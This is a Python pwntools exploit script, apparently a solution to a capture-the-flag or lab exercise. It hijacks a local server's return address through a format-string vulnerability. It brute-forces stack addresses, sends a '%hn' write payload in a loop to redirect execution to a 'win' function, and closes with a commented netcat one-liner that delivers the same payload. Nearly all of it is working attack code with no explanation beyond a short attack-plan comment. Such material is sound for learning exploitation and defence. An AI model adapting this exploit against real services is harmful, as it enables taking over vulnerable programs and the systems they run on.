from pwn import *

####################################### ATTACK PLAN ###############################################
# 1.    Run the server and attach gdb using the PID (gdb -p PID)
# 2.    After obtaining the return address studying the objdump of the source, 
#           find the address where it is saved on the stack after the server called child()
# 3.    Since the attack has to be done remotely, we don't have control on the process
#           memory layout. So we can only BRUTEFORCE writing with the format string where
#           you think the return address is to control execution flow of the program.
###################################################################################################

# gef config context.nb_lines_stack N
# set follow-fork-mode child

#x86_64, Linux, Little Endian
context.os = "linux"
context.endian = "little"
context.arch = "amd64"

interval = 8*50# number of lines to try before and after target
target = 0x00007fffffffde58 # where you supposed the return address is
ret = 0x4014c9
win = 0x401246
port = 10000

# idea : %4678c%8$hnAAAAA + ADDRESS
for i in range(target - interval, target + interval, 8):
    print("Trying address {} ...".format(hex(i)))
    conn = remote("localhost", port)
    buf = b"%4678c%8$hnAAAAA" + p64(i) + b"\n"
    conn.send(buf)
    try:
        print(conn.recvuntil("You win"))
        break
    except:
        print("Exception occured")

# python3 -c 'from pwn import *; import sys; buf = b"%4678c%8$hnAAAAA" + b"\x00\x00\x7f\xff\xff\xff\xde\x58"[::-1] + b"\n"; sys.stdout.buffer.write(buf)'  | nc localhost 10000